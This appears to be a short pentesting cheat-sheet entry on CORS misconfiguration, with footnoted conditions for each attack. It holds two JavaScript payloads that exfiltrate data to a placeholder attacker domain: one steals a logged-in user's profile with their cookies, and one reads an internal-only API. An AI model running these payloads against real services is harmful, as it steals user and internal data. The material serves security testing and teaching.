# CORS Misconfiguration

## Table of Contents

- [Data Exfiltration](#data-exfiltration)
- [Bypassing IP-based Authentication](#bypassing-ip-based-authentication)

## Data Exfiltration

### Sensitive user data can be exfiltrated. [^1]

- Account information exposure
    ```html
    <script>
        (async () => {
            const response = await fetch('https://[VULNERABLE-SERVICE]/profile', {
                method: 'GET',
                credentials: 'include'
            });

            const data = await response.json();
            const base64 = btoa(JSON.stringify(data));

            const targetUrl = `https://[ATTACKER-DOMAIN]/?response=${encodeURIComponent(base64)}`;
            window.open(targetUrl, '_blank');
        })();
    </script>
    ```

## Bypassing IP-based Authentication

### If a service relies solely on IP-based authentication (e.g., allowing access only to users within the internal network), an attacker can bypass that restriction and exfiltrate data. [^2]

- Accessing internal APIs
    ```html
    <!-- Hosted on an external domain -->
    <script>
        fetch('http://[VULNERABLE-SERVICE]/api/auth/audit-log') //accessible only from the internal network
            .then(response => response.json())
            .then(data => {
                fetch('https://[ATTACKER-DOMAIN]/', {
                    method: 'POST',
                    body: JSON.stringify(data)
                });
            });
    </script>
    ```

[^1]: Applies when the service reflects the requesting origin in `Access-Control-Allow-Origin` together with `Access-Control-Allow-Credentials: true`, and the session cookie is set with `SameSite=None`.
[^2]: Applies when the internal service allows any origin (e.g., `Access-Control-Allow-Origin: *`). No cookie is required, because access is granted by the victim's network location.
